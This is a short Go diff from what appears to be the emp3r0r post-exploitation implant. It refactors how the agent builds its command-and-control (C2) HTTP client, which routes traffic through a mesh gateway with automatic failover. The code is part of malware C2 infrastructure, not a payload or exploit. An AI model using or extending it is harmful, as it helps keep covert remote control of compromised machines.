@@ -4,7 +4,6 @@ import (
 	"context"
 	"fmt"
 	"net"
-	"net/http"
 	"os"
 	"os/user"
 	"runtime"
@@ -149,17 +148,16 @@ func agent_main() {
 			// Build the C2 HTTP client with TLS config, then override its DialContext
 			// to dial a fresh DialGateway per request using the current best gateway.
 			// mesh.GetGatewayIP() is re-evaluated per dial, so gateway failover is automatic.
-			def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
-			if def.HTTPClient != nil {
-				if tr, ok := def.HTTPClient.Transport.(*http.Transport); ok {
-					tr.DialContext = func(ctx context.Context, _, _ string) (net.Conn, error) {
-						gwIP := mesh.GetGatewayIP()
-						if gwIP == "" {
-							return nil, fmt.Errorf("mesh: no gateway available")
-						}
-						return mesh.DialGateway(ctx, gwIP)
-					}
+			transport.GlobalMeshDialer = func(ctx context.Context, _, _ string) (net.Conn, error) {
+				gwIP := mesh.GetGatewayIP()
+				if gwIP == "" {
+					return nil, fmt.Errorf("mesh: no gateway available")
 				}
+				return mesh.DialGateway(ctx, gwIP)
+			}
+			def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, "")
+			if def.HTTPClient == nil {
+				logging.Fatalf("Failed to create mesh C2 client")
 			}
 			logging.Printf("[+] Mesh route ready via gateway %s", mesh.GetGatewayIP())
 		} else {
